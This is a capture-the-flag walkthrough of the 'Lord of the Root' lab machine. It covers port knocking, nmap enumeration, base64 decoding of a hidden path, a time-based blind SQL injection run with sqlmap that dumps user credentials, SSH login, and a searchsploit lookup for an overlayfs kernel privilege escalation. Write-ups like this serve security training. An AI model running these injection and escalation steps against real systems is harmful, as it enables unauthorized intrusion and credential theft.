[*] LORDOFTHEROOT [*]

# Date : 02/02/2022

# ->Enumeration Phase:

>> when try to login ssh then give following message:
>> there is concept of port kanocking.

The authenticity of host '192.168.0.102 (192.168.0.102)' can't be established.
ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.102' (ECDSA) to the list of known hosts.

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
admin@192.168.0.102's password: 

>> knock <IP> 1 2 3
>> and again scan the network

# Nmap 7.91 scan initiated Thu Feb  3 22:31:51 2022 as: nmap -v -sC -sV -p- -oN nmap_udp 192.168.0.105
Nmap scan report for 192.168.0.105
Host is up (0.00037s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:3F:BA:E2 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  3 22:33:54 2022 -- 1 IP address (1 host up) scanned in 123.17 seconds

>> there is robots.txt file is present.
>> source code of robots.txt page : THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh | base64 encoded string
>> # decode it : Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer! | again encoded string
>> # decode it : /978345210/index.php
>> on index.php page having login service . so save this request from burpsuite and test it for sqlinjection using sqlmap tool.
>> # sqlmap -r <FILE.req> --dump --risk 3 --level 5

# ->Exploitation Phase:

>> # sqlmap -r exploit.req -D Webapp -T Users -C username,password --dump

        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:02:10 /2022-02-04/

[00:02:11] [INFO] parsing HTTP request from 'exploit.req'
it appears that provided value for POST parameter 'submit' has boundaries. Do you want to inject inside? (' Login* ') [y/N] y
[00:02:15] [INFO] resuming back-end DBMS 'mysql' 
[00:02:15] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.0.105:1337/978345210/profile.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 7322 FROM (SELECT(SLEEP(5)))Pfzc)-- hdJx&password=password&submit= Login
---
[00:02:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.12
[00:02:20] [INFO] fetching entries of column(s) 'password,username' for table 'Users' in database 'Webapp'
[00:02:20] [INFO] fetching number of column(s) 'password,username' entries for table 'Users' in database 'Webapp'
[00:02:20] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                   
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[00:02:30] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
5
[00:02:36] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)          
[00:02:43] [INFO] adjusting time delay to 1 second due to good response times
AndMyAxe
[00:03:15] [INFO] retrieved: gimli
[00:03:33] [INFO] retrieved: AndMyBow
[00:04:09] [INFO] retrieved: legolas
[00:04:34] [INFO] retrieved: AndMySword
[00:05:17] [INFO] retrieved: aragorn
[00:05:41] [INFO] retrieved: iwilltakethering
[00:06:36] [INFO] retrieved: frodo
[00:06:56] [INFO] retrieved: MyPreciousR00t
[00:07:49] [INFO] retrieved: smeagol
Database: Webapp
Table: Users
[5 entries]
+----------+------------------+
| username | password         |
+----------+------------------+
| gimli    | AndMyAxe         |
| legolas  | AndMyBow         |
| aragorn  | AndMySword       |
| frodo    | iwilltakethering |
| smeagol  | MyPreciousR00t   |
+----------+------------------+

[00:08:13] [INFO] table 'Webapp.Users' dumped to CSV file '/home/cdark/.local/share/sqlmap/output/192.168.0.105/dump/Webapp/Users.csv'
[00:08:13] [INFO] fetched data logged to text files under '/home/cdark/.local/share/sqlmap/output/192.168.0.105'

[*] ending @ 00:08:13 /2022-02-04/

>> # ssh creads:
# username : smeagol
# password : MyPreciousR00t


# ->PostExploitation Phase:

>> check kernel version : 3.19.0-25-generic (uname -r)
>> check Ubuntu version : Ubuntu 14.04.3 LTS \n \l (cat /etc/issue)

>> search vulnerbility for that version by using searchsploit tool.

# Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1)        | linux/local/39166.c


# Proof.txt:

“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf



